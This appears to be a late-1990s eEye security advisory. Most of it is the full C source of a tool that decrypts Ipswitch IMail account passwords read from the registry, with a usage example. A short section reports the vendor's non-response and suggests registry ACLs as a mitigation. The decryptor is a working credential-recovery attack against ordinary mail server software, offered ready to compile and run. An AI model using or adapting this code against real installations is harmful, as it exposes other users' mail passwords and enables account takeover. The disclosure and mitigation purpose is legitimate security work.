/*
 * IMail password decryptor
 * By: Mike Davis (mike@eEye.com)
 *
 * Thanks to Marc and Jason for testing and their general eliteness.
 * Usage: imaildec <account name> <encrypted password>
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <memory.h>

void usage (char *);
int search (char *);
int eql (char *, char *);
int lc (int);
int strlen();

struct
{
  char *string;
  int o;
} hashtable[255];

struct { char *string; } encrypted[60];

char *list = "0123456789ABCDEF";

int alpha[95] = {
  32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49,
  50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67,
  68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85,
  86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102,
  103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116,
  117, 118, 119, 120, 121, 122, 123, 124, 125, 126 
};

int
main (int argc, char *argv[])
{
  int i, j, k, ascii, start, diffs[66], num, loop;
  char asciic[155];

  if (argc <= 2 || argc > 3) usage (argv[0]);
  if (strlen (argv[2]) > 62)
  {
     printf ("\nERROR: Please enter an encrypted password less than 60 "
             "characters.\n\n");

     usage (argv[0]);
  }

  printf ("IMail password decryptor\nBy: Mike <Mike@eEye.com>\n\n");

  ascii = -97;

  /* Make the hash table we will need to refer to. */
  for (i = 0, start = 0; i < strlen (list); i++)
  {
     for (k = 0; k < strlen (list); k++)
     {
        hashtable[start].string = (char *) malloc (3);
        sprintf (hashtable[start].string, "%c%c", list[i], list[k]);
        hashtable[start].o = ascii++;

        /* Don't want to skip one! */
        if ((k + 1) != strlen (list)) start++;
     }

     start++;
  }

  for (k = 0, start = 0; k < strlen (argv[1]); k += strlen (argv[1]))
  {
     for (j = k; j < k + strlen (argv[2]); j += 2, start++)
     {
        encrypted[start].string = (char *) malloc (3);
        sprintf (encrypted[start].string, "%c%c", argv[2][j],
                 argv[2][j + 1]);
     }
  }

  for (j = 0, start = 0; j < strlen(argv[2]) / strlen(argv[1]); j++)
     for (i = 0; i < strlen (argv[1]); i++, start++)
        diffs[start] = (lc(argv[1][0]) - lc(argv[1][i]));

  printf ("Account Name: %s\n", argv[1]);

  printf ("Encrypted: ");
  for (i = 0; i < strlen (argv[2]) / 2; i++) printf ("%s", encrypted[i]);
  putchar('\n');

  printf ("Unencrypted: ");
  for (i = 0, loop = 0; i < strlen (argv[2]) / 2; i++, loop++)
  {
     num = search (encrypted[i].string) + diffs[i];
     if (loop == 0)
     {
        /* Make alphabet */
        for (j = lc (argv[1][0]) - 65, start = 0;
             j <= lc (argv[1][0]) + 29;
             j++, start++)
        {
           asciic[j] = alpha[start];
        }
     }

     putchar(asciic[num]);
  }

  putchar('\n');
  return 0;
}

int
search (char *term)
{
  register int n;

  for (n = 0; n < 255; n++)
     if (hashtable[n].string && eql (hashtable[n].string, term))
        return hashtable[n].o;

  return 0;
}

int
eql (char *first, char *second)
{
  register int i;
  for (i = 0; first[i] && (first[i] == second[i]); i++);

  return (first[i] == second[i]);
}

int
lc (int letter)
{
  if (letter >= 'A' && letter <= 'Z') return letter + 'a' - 'A';
  else return letter;
}

void
usage (char *name)
{

  printf ("IMail password decryptor\n");
  printf ("By: Mike (Mike@eEye.com)\n\n");
  printf ("Usage: %s <account name> <encrypted string>\n", name);
  printf ("E.g., %s crypto CCE5DFE5E2\n", name);
  exit (0);
}

---------------------------------------------------------------------------
Patch:

Ipswitch was notified of this advisory last week, and they have not
responded.  They released a never version afterwards, but we cannot
confirm whether or not this latest version, 6.01 fixes the vulnerability.
Their site says:
  This patch fixes problems with POP server and IAdmin application,
  including external database authentication problems and possible
  password corruption problems.

Until we have positive confirmation, you can set an ACL on each registry
key containing the password to prevent normal users (while still allowing
IMail) from viewing other users' passwords.  You are safe to remove read
permissions on these registry keys--they will not affect IMail (as it
doesn't run with user privileges).

---------------------------------------------------------------------------
People that deserve hellos: eEye, USSR, and Interrupt

w00sites:
http://www.attrition.org
http://www.eEye.com
http://www.ussrback.com


